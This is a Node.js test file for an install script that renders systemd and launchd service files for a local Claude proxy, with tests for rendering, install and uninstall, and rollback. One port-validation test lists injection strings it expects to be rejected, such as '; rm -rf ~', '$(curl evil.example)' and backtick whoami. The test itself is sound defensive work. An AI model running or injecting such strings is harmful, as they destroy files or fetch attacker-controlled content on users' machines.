import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readFile, writeFile, rm, readdir, mkdir } from "node:fs/promises";
import { tmpdir, platform } from "node:os";
import { join, dirname } from "node:path";
import { execFile } from "node:child_process";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  renderSystemdTemplate,
  renderLaunchdTemplate,
  renderHealthcheckServiceTemplate,
  renderHealthcheckTimerTemplate,
  getPaths,
  validatePort,
  InvalidPortError,
  installSystemd,
  installSystemdHealthcheck,
  installLaunchd,
  uninstallSystemd,
  uninstallSystemdHealthcheck,
  uninstallLaunchd,
  install,
  TEMPLATE_DIR,
} from "../bin/install-service.mjs";

const execFileP = promisify(execFile);
const __dirname = dirname(fileURLToPath(import.meta.url));
const BIN = join(__dirname, "..", "bin", "claude-via-proxy.mjs");

async function newTmp() {
  return mkdtemp(join(tmpdir(), "install-service-test-"));
}

const sampleVars = {
  node: "/usr/local/bin/node",
  serverPath: "/opt/cache-fix/proxy/server.mjs",
  port: "9801",
  upstream: "",
  debug: "",
  workingDir: "/opt/cache-fix",
  requires: "",
};

// --- Template rendering ---

test("renderSystemdTemplate: substitutes core fields", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, sampleVars);
  assert.ok(out.includes("ExecStart=/usr/local/bin/node /opt/cache-fix/proxy/server.mjs"));
  assert.ok(out.includes("Environment=CACHE_FIX_PROXY_PORT=9801"));
  assert.ok(out.includes("WorkingDirectory=/opt/cache-fix"));
  assert.ok(out.includes("WantedBy=default.target"));
});

test("renderSystemdTemplate: omits empty optional Environment lines", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, sampleVars);
  assert.ok(!out.includes("CACHE_FIX_PROXY_UPSTREAM"));
  assert.ok(!out.includes("CACHE_FIX_DEBUG"));
  // No leftover empty placeholders
  assert.ok(!out.includes("{{"));
  assert.ok(!out.includes("}}"));
});

test("renderSystemdTemplate: includes UPSTREAM and DEBUG when set", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, {
    ...sampleVars,
    upstream: "http://127.0.0.1:8080",
    debug: "1",
  });
  assert.ok(out.includes("Environment=CACHE_FIX_PROXY_UPSTREAM=http://127.0.0.1:8080"));
  assert.ok(out.includes("Environment=CACHE_FIX_DEBUG=1"));
});

test("renderSystemdTemplate: requires line wires both Requires and After", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, { ...sampleVars, requires: "llm-relay.service" });
  assert.ok(out.includes("Requires=llm-relay.service"));
  assert.ok(out.includes("After=llm-relay.service"));
});

test("renderLaunchdTemplate: substitutes core fields and renders valid plist", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "com.cnighswonger.cache-fix-proxy.plist.template"),
    "utf-8",
  );
  const out = renderLaunchdTemplate(tpl, {
    ...sampleVars,
    logDir: "/Users/test/Library/Logs",
  });
  assert.ok(out.includes("<string>com.cnighswonger.cache-fix-proxy</string>"));
  assert.ok(out.includes("<string>/usr/local/bin/node</string>"));
  assert.ok(out.includes("<string>/opt/cache-fix/proxy/server.mjs</string>"));
  assert.ok(out.includes("<string>9801</string>"));
  assert.ok(out.includes("<string>/Users/test/Library/Logs/cache-fix-proxy.log</string>"));
  assert.ok(!out.includes("{{"));
});

test("renderLaunchdTemplate: omits CACHE_FIX_PROXY_UPSTREAM/DEBUG when not set", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "com.cnighswonger.cache-fix-proxy.plist.template"),
    "utf-8",
  );
  const out = renderLaunchdTemplate(tpl, {
    ...sampleVars,
    logDir: "/tmp/logs",
  });
  assert.ok(!out.includes("CACHE_FIX_PROXY_UPSTREAM"));
  assert.ok(!out.includes("CACHE_FIX_DEBUG"));
});

// #196 / #198: CACHE_FIX_HOT_RELOAD env-capture rendering. install-service
// reads CACHE_FIX_HOT_RELOAD from the env at install time and bakes it into
// the generated unit/plist when set to the literal "on", omits the slot
// entirely otherwise. Matches the existing PORT/UPSTREAM/DEBUG precedent.

test("renderSystemdTemplate: omits CACHE_FIX_HOT_RELOAD when not set", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, sampleVars);
  assert.ok(!out.includes("CACHE_FIX_HOT_RELOAD"));
});

test("renderSystemdTemplate: includes CACHE_FIX_HOT_RELOAD=on when set", async () => {
  const tpl = await readFile(join(TEMPLATE_DIR, "cache-fix-proxy.service.template"), "utf-8");
  const out = renderSystemdTemplate(tpl, { ...sampleVars, hotReload: "on" });
  assert.ok(out.includes("Environment=CACHE_FIX_HOT_RELOAD=on"));
});

test("renderLaunchdTemplate: omits CACHE_FIX_HOT_RELOAD when not set", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "com.cnighswonger.cache-fix-proxy.plist.template"),
    "utf-8",
  );
  const out = renderLaunchdTemplate(tpl, { ...sampleVars, logDir: "/tmp/logs" });
  assert.ok(!out.includes("CACHE_FIX_HOT_RELOAD"));
});

test("renderLaunchdTemplate: includes CACHE_FIX_HOT_RELOAD=on when set", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "com.cnighswonger.cache-fix-proxy.plist.template"),
    "utf-8",
  );
  const out = renderLaunchdTemplate(tpl, {
    ...sampleVars,
    logDir: "/tmp/logs",
    hotReload: "on",
  });
  assert.ok(out.includes("<key>CACHE_FIX_HOT_RELOAD</key>"));
  assert.ok(out.includes("<string>on</string>"));
  // Plist must remain well-formed: no stray template tags.
  assert.ok(!out.includes("{{"));
});

// --- Port validation (shell-injection guard) ---

test("validatePort: accepts valid numeric strings", () => {
  assert.equal(validatePort("9801"), "9801");
  assert.equal(validatePort("1"), "1");
  assert.equal(validatePort("65535"), "65535");
  assert.equal(validatePort(8080), "8080");
  assert.equal(validatePort("  9801  "), "9801");
});

test("validatePort: rejects shell metacharacters and other hostile input", () => {
  const hostile = [
    "9801; rm -rf ~",
    "9801'; echo pwned; '",
    "9801$(curl evil.example)",
    "9801`whoami`",
    "9801 || true",
    "9801\necho",  // embedded newline + content
    "9801 9802",
    "abc",
    "0x1eAB",
    "",
    "  ",
    "9801.0",
  ];
  for (const v of hostile) {
    assert.throws(() => validatePort(v), InvalidPortError, `should reject ${JSON.stringify(v)}`);
  }
});

test("validatePort: tolerates surrounding whitespace (env var hygiene)", () => {
  // Trailing newline / leading space from accidental shell quoting in env
  // vars is common and benign — trim before validating, accept what's left.
  assert.equal(validatePort("9801\n"), "9801");
  assert.equal(validatePort(" 9801"), "9801");
  assert.equal(validatePort("\t9801\t"), "9801");
});

test("validatePort: rejects out-of-range ports", () => {
  assert.throws(() => validatePort("0"), InvalidPortError);
  assert.throws(() => validatePort("65536"), InvalidPortError);
  assert.throws(() => validatePort("99999"), InvalidPortError);
});

test("validatePort: rejects non-string-non-number types", () => {
  assert.throws(() => validatePort(null), InvalidPortError);
  assert.throws(() => validatePort(undefined), InvalidPortError);
  assert.throws(() => validatePort({}), InvalidPortError);
  assert.throws(() => validatePort([]), InvalidPortError);
});

// --- Healthcheck template rendering ---

test("renderHealthcheckServiceTemplate: substitutes PORT", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "cache-fix-proxy-healthcheck.service.template"),
    "utf-8",
  );
  const out = renderHealthcheckServiceTemplate(tpl, { port: "9988" });
  assert.ok(out.includes("http://127.0.0.1:9988/health"));
  assert.ok(out.includes("systemctl --user start cache-fix-proxy.service"));
  assert.ok(out.includes("Type=oneshot"));
  assert.ok(!out.includes("{{"));
});

test("renderHealthcheckTimerTemplate: returns template unchanged (no placeholders today)", async () => {
  const tpl = await readFile(
    join(TEMPLATE_DIR, "cache-fix-proxy-healthcheck.timer.template"),
    "utf-8",
  );
  const out = renderHealthcheckTimerTemplate(tpl);
  assert.equal(out, tpl);
  assert.ok(out.includes("OnUnitActiveSec=2min"));
  assert.ok(out.includes("Unit=cache-fix-proxy-healthcheck.service"));
  assert.ok(out.includes("WantedBy=timers.target"));
});

// --- Platform detection ---

test("getPaths: linux returns systemd shape", () => {
  const p = getPaths("linux");
  assert.equal(p.kind, "systemd");
  assert.ok(p.configDir.endsWith(".config/systemd/user"));
  assert.equal(p.configFile, "cache-fix-proxy.service");
  assert.equal(p.healthcheckServiceFile, "cache-fix-proxy-healthcheck.service");
  assert.equal(p.healthcheckTimerFile, "cache-fix-proxy-healthcheck.timer");
});

test("getPaths: darwin returns launchd shape", () => {
  const p = getPaths("darwin");
  assert.equal(p.kind, "launchd");
  assert.ok(p.configDir.endsWith("Library/LaunchAgents"));
  assert.equal(p.configFile, "com.cnighswonger.cache-fix-proxy.plist");
  assert.ok(p.logDir);
});

test("getPaths: unsupported platform returns kind=unsupported", () => {
  const p = getPaths("freebsd");
  assert.equal(p.kind, "unsupported");
  assert.equal(p.platform, "freebsd");
});

// --- installSystemd / uninstallSystemd round-trip ---

test("installSystemd: writes file to configDir; uninstall removes it", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r1 = await installSystemd({ paths, defaults: { port: "9999", upstream: "", debug: "", workingDir: "/tmp" } });
    assert.ok(r1.ok);
    const onDisk = await readFile(join(dir, "cache-fix-proxy.service"), "utf-8");
    assert.ok(onDisk.includes("CACHE_FIX_PROXY_PORT=9999"));

    const r2 = await uninstallSystemd({ paths });
    assert.ok(r2.ok);
    const files = await readdir(dir);
    assert.deepEqual(files, []);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// #196 / #198 end-to-end: installSystemd / installLaunchd must thread the
// hotReload field through to the on-disk unit / plist. Earlier rounds of
// this change tested only the renderer helpers and missed this path.

test("installSystemd: hotReload from defaults reaches the written file", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r = await installSystemd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", hotReload: "on", workingDir: "/tmp" },
    });
    assert.ok(r.ok);
    const onDisk = await readFile(join(dir, "cache-fix-proxy.service"), "utf-8");
    assert.ok(
      onDisk.includes("Environment=CACHE_FIX_HOT_RELOAD=on"),
      "installSystemd must write the CACHE_FIX_HOT_RELOAD=on Environment= line when defaults.hotReload is 'on'",
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemd: hotReload empty/unset omits the line from the written file", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r = await installSystemd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", hotReload: "", workingDir: "/tmp" },
    });
    assert.ok(r.ok);
    const onDisk = await readFile(join(dir, "cache-fix-proxy.service"), "utf-8");
    assert.ok(
      !onDisk.includes("CACHE_FIX_HOT_RELOAD"),
      "installSystemd must NOT write a CACHE_FIX_HOT_RELOAD line when defaults.hotReload is empty",
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installLaunchd: hotReload from defaults reaches the written plist", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "launchd",
      configDir: dir,
      configFile: "com.cnighswonger.cache-fix-proxy.plist",
      label: "com.cnighswonger.cache-fix-proxy",
      logDir: "/tmp/logs",
    };
    const r = await installLaunchd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", hotReload: "on", workingDir: "/tmp" },
    });
    assert.ok(r.ok);
    const onDisk = await readFile(join(dir, "com.cnighswonger.cache-fix-proxy.plist"), "utf-8");
    assert.ok(
      onDisk.includes("<key>CACHE_FIX_HOT_RELOAD</key>"),
      "installLaunchd must write the CACHE_FIX_HOT_RELOAD key into the plist when defaults.hotReload is 'on'",
    );
    assert.ok(onDisk.includes("<string>on</string>"));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installLaunchd: hotReload empty/unset omits the key from the written plist", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "launchd",
      configDir: dir,
      configFile: "com.cnighswonger.cache-fix-proxy.plist",
      label: "com.cnighswonger.cache-fix-proxy",
      logDir: "/tmp/logs",
    };
    const r = await installLaunchd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", hotReload: "", workingDir: "/tmp" },
    });
    assert.ok(r.ok);
    const onDisk = await readFile(join(dir, "com.cnighswonger.cache-fix-proxy.plist"), "utf-8");
    assert.ok(
      !onDisk.includes("CACHE_FIX_HOT_RELOAD"),
      "installLaunchd must NOT write a CACHE_FIX_HOT_RELOAD key when defaults.hotReload is empty",
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemd: refuses overwrite without force", async () => {
  const dir = await newTmp();
  try {
    const paths = { kind: "systemd", configDir: dir, configFile: "cache-fix-proxy.service", healthcheckServiceFile: "cache-fix-proxy-healthcheck.service", healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer" };
    await installSystemd({ paths, defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" } });
    const r2 = await installSystemd({ paths, defaults: { port: "9999", upstream: "", debug: "", workingDir: "/tmp" } });
    assert.equal(r2.ok, false);
    assert.equal(r2.reason, "already-installed");
    // File should NOT be modified
    const onDisk = await readFile(join(dir, "cache-fix-proxy.service"), "utf-8");
    assert.ok(onDisk.includes("CACHE_FIX_PROXY_PORT=9801"));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemd: --force overwrites existing", async () => {
  const dir = await newTmp();
  try {
    const paths = { kind: "systemd", configDir: dir, configFile: "cache-fix-proxy.service", healthcheckServiceFile: "cache-fix-proxy-healthcheck.service", healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer" };
    await installSystemd({ paths, defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" } });
    const r2 = await installSystemd({
      paths,
      defaults: { port: "9999", upstream: "", debug: "", workingDir: "/tmp" },
      force: true,
    });
    assert.ok(r2.ok);
    const onDisk = await readFile(join(dir, "cache-fix-proxy.service"), "utf-8");
    assert.ok(onDisk.includes("CACHE_FIX_PROXY_PORT=9999"));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("uninstallSystemd: not-installed when file missing", async () => {
  const dir = await newTmp();
  try {
    const paths = { kind: "systemd", configDir: dir, configFile: "cache-fix-proxy.service", healthcheckServiceFile: "cache-fix-proxy-healthcheck.service", healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer" };
    const r = await uninstallSystemd({ paths });
    assert.equal(r.ok, false);
    assert.equal(r.reason, "not-installed");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Healthcheck install/uninstall round-trip ---

test("installSystemdHealthcheck: writes both service and timer files", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r = await installSystemdHealthcheck({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.equal(r.installed, true);
    const svc = await readFile(join(dir, "cache-fix-proxy-healthcheck.service"), "utf-8");
    const tmr = await readFile(join(dir, "cache-fix-proxy-healthcheck.timer"), "utf-8");
    assert.ok(svc.includes("http://127.0.0.1:9801/health"));
    assert.ok(tmr.includes("OnUnitActiveSec=2min"));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemdHealthcheck: refuses overwrite without force; force overwrites", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    await installSystemdHealthcheck({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    // Second install without force → refuses
    const r2 = await installSystemdHealthcheck({
      paths,
      defaults: { port: "9988", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.equal(r2.installed, false);
    assert.equal(r2.reason, "already-installed");
    const svc = await readFile(join(dir, "cache-fix-proxy-healthcheck.service"), "utf-8");
    assert.ok(svc.includes(":9801/"), "file should not have been overwritten");

    // With force → overwrites
    const r3 = await installSystemdHealthcheck({
      paths,
      defaults: { port: "9988", upstream: "", debug: "", workingDir: "/tmp" },
      force: true,
    });
    assert.equal(r3.installed, true);
    const svc2 = await readFile(join(dir, "cache-fix-proxy-healthcheck.service"), "utf-8");
    assert.ok(svc2.includes(":9988/"), "file should have been overwritten");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("uninstallSystemdHealthcheck: removes both files; counts how many removed", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    await installSystemdHealthcheck({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    const r = await uninstallSystemdHealthcheck({ paths });
    assert.equal(r.removed, 2);
    const files = await readdir(dir);
    assert.deepEqual(files, []);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemdHealthcheck: refuses overwrite when ONLY timer file pre-exists (asymmetric guard)", async () => {
  // Codex re-review case: service missing, timer present. v1 of the check
  // only looked at the service file and would silently overwrite the timer.
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    // Pre-create ONLY the timer file (not the service)
    await writeFile(join(dir, "cache-fix-proxy-healthcheck.timer"), "PRE_EXISTING_TIMER");
    const r = await installSystemdHealthcheck({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.equal(r.installed, false);
    assert.equal(r.reason, "already-installed");
    // Timer must NOT have been overwritten
    const onDisk = await readFile(join(dir, "cache-fix-proxy-healthcheck.timer"), "utf-8");
    assert.equal(onDisk, "PRE_EXISTING_TIMER");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemdHealthcheck: refuses overwrite when ONLY service file pre-exists (symmetric guard)", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    // Pre-create ONLY the service file
    await writeFile(join(dir, "cache-fix-proxy-healthcheck.service"), "PRE_EXISTING_SERVICE");
    const r = await installSystemdHealthcheck({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.equal(r.installed, false);
    const onDisk = await readFile(join(dir, "cache-fix-proxy-healthcheck.service"), "utf-8");
    assert.equal(onDisk, "PRE_EXISTING_SERVICE");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemd: rolls back main unit if healthcheck install throws", async () => {
  // Half-install rollback: if the healthcheck pair can't be written (e.g.
  // template missing, fs error past the existence check), the main unit
  // must NOT be left on disk — otherwise the user has the proxy unit but
  // no auto-recovery, contrary to what the install message promised.
  //
  // Trigger the exception path by pointing the healthcheck filenames at
  // template files that DON'T exist on disk (the readFile inside
  // installSystemdHealthcheck will throw ENOENT).
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      // These point to template basenames that don't exist in templates/,
      // so the healthcheck readFile will throw ENOENT. (The "real" basenames
      // in install-service.mjs are hardcoded — we swap getPaths fields here
      // by giving the install fn paths whose existence check passes but
      // whose later writeFile target is unreachable. Easiest trigger: make
      // the configDir into a path that mkdir can't handle.)
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    // Force healthcheck writeFile to fail by making the eventual healthcheck
    // service path EXIST AS A DIRECTORY *after* the existence check. Trick:
    // pre-create it as a directory, AND pass force:true so the existence
    // check doesn't short-circuit to "already-installed".
    await mkdir(join(dir, "cache-fix-proxy-healthcheck.service"), { recursive: true });

    let threw = null;
    try {
      await installSystemd({
        paths,
        defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
        force: true,
      });
    } catch (err) {
      threw = err;
    }
    assert.ok(threw, "installSystemd must throw when healthcheck writeFile fails");
    // Main unit must NOT exist after rollback
    const files = await readdir(dir);
    assert.equal(
      files.includes("cache-fix-proxy.service"),
      false,
      `main unit must have been rolled back; remaining files: ${JSON.stringify(files)}`,
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("uninstallSystemdHealthcheck: missing files counted as 0 removed (no error)", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r = await uninstallSystemdHealthcheck({ paths });
    assert.equal(r.removed, 0);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installSystemd: now also drops healthcheck companion alongside main unit", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    const r = await installSystemd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.ok(r.ok);
    assert.ok(r.healthcheck?.installed, "healthcheck should be installed alongside main unit");
    const files = (await readdir(dir)).sort();
    assert.deepEqual(files, [
      "cache-fix-proxy-healthcheck.service",
      "cache-fix-proxy-healthcheck.timer",
      "cache-fix-proxy.service",
    ]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("uninstallSystemd: now also removes healthcheck companion alongside main unit", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "systemd",
      configDir: dir,
      configFile: "cache-fix-proxy.service",
      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
    };
    await installSystemd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    const r = await uninstallSystemd({ paths });
    assert.ok(r.ok);
    assert.equal(r.healthcheck?.removed, 2, "uninstall should remove both companion files");
    const files = await readdir(dir);
    assert.deepEqual(files, []);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- installLaunchd / uninstallLaunchd round-trip ---

// --- CLI orchestration: end-to-end through dispatch() (Linux only) ---

test("install() CLI orchestration: --force overwrites existing service file (linux)", { skip: platform() !== "linux" }, async () => {
  const dir = await newTmp();
  const realHome = process.env.HOME;
  try {
    process.env.HOME = dir;
    // First install: should succeed.
    const c1 = await install();
    assert.equal(c1, 0);
    const target = join(dir, ".config", "systemd", "user", "cache-fix-proxy.service");
    const before = await readFile(target, "utf-8");

    // Mutate the file so we can prove the overwrite happened, then re-install
    // without --force: should refuse.
    await writeFile(target, "MUTATED");
    const c2 = await install({ force: false });
    assert.equal(c2, 1, "second install without --force must refuse");
    assert.equal(await readFile(target, "utf-8"), "MUTATED", "file must be unchanged");

    // Re-install WITH --force: should overwrite.
    const c3 = await install({ force: true });
    assert.equal(c3, 0, "install --force must succeed");
    const after = await readFile(target, "utf-8");
    assert.notEqual(after, "MUTATED", "file must have been rewritten");
    assert.ok(after.includes("CACHE_FIX_PROXY_PORT="), "rewritten file must look like a real unit");
  } finally {
    process.env.HOME = realHome;
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Back-compat: subcommand dispatch must not eat wrapper-mode args ---

test("dispatch back-compat: --proxy-port + claude-arg passes through to wrapper mode", async () => {
  // Write a tiny intercept script so CACHE_FIX_CLAUDE_CMD can be a clean
  // `node <path>` (no embedded spaces in arg payload — the wrapper splits
  // CACHE_FIX_CLAUDE_CMD naively on whitespace).
  const dir = await newTmp();
  const interceptScript = join(dir, "intercept.mjs");
  await writeFile(
    interceptScript,
    'process.stdout.write("INTERCEPT:" + JSON.stringify({argv: process.argv.slice(2), base: process.env.ANTHROPIC_BASE_URL}));\n',
  );
  try {
    const { stdout } = await execFileP(
      process.execPath,
      [BIN, "--proxy-port", "9876", "some-claude-arg", "--another"],
      {
        env: {
          ...process.env,
          CACHE_FIX_CLAUDE_CMD: `${process.execPath} ${interceptScript}`,
        },
        timeout: 15000,
      },
    );
    const match = stdout.match(/INTERCEPT:(\{.*\})/);
    assert.ok(match, `expected wrapper-intercept JSON in stdout; got: ${JSON.stringify(stdout)}`);
    const parsed = JSON.parse(match[1]);
    assert.deepEqual(parsed.argv, ["some-claude-arg", "--another"], "wrapper-mode args must reach the claude command");
    assert.equal(parsed.base, "http://127.0.0.1:9876", "ANTHROPIC_BASE_URL must reflect --proxy-port");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("installLaunchd: writes plist to configDir; uninstall removes it", async () => {
  const dir = await newTmp();
  try {
    const paths = {
      kind: "launchd",
      configDir: dir,
      configFile: "com.cnighswonger.cache-fix-proxy.plist",
      logDir: "/tmp/logs",
    };
    const r1 = await installLaunchd({
      paths,
      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
    });
    assert.ok(r1.ok);
    const onDisk = await readFile(join(dir, "com.cnighswonger.cache-fix-proxy.plist"), "utf-8");
    assert.ok(onDisk.includes("<key>Label</key>"));
    assert.ok(onDisk.includes("com.cnighswonger.cache-fix-proxy"));

    const r2 = await uninstallLaunchd({ paths });
    assert.ok(r2.ok);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
